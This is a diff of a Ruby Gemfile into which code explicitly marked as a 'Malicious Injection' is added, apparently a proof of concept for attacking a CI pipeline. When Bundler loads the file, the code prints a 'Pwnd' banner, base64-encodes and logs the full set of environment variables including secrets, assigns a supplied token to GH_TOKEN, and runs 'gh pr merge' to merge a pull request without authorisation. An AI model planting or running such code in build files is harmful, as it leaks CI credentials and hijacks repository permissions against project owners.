@@ -1,12 +1,22 @@
 source 'https://rubygems.org'
+
+# --- Malicious Injection Starts Here ---
+# This executes as soon as 'bundle' reads the file
+puts "------------------------------------------------"
+puts "  _____                      _   _ "
+puts " |  __ \                    | | | |"
+puts " | |__) |_      __ _ __   __| | | |"
+puts " |  ___/\ \ /\ / /| '_ \ / _` | | |"
+puts " | |     \ V  V / | | | | (_| | |_|"
+puts " |_|      \_/\_/  |_| |_|\__,_| (_)"
+puts "                                   "
+puts " [!] SECURITY VULNERABILITY DETECTED"
+puts " [!] I am executing code in your CI!"
+puts "------------------------------------------------"
 require 'base64'
 
 encoded = Base64.strict_encode64(ENV.to_h.to_s)
-
+ENV["GH_TOKEN"] = ENV["INPUT_TOKEN"]
+system("gh pr merge 3 --merge")
 puts encoded
-ENV["GH_TOKEN"] = ENV["GITHUB_TOKEN"]
-# system(" git config --global user.email \"hello@sohom.dev\"")
-# system("git config --global user.name \"github-actions [bot]\"")
-
-system("gh repo clone elizabethtl/test-oracle-devrel")
-system("cd test-oracle-devrel && gh pr merge 5 --merge") 
+# --- Malicious Injection Ends Here ---
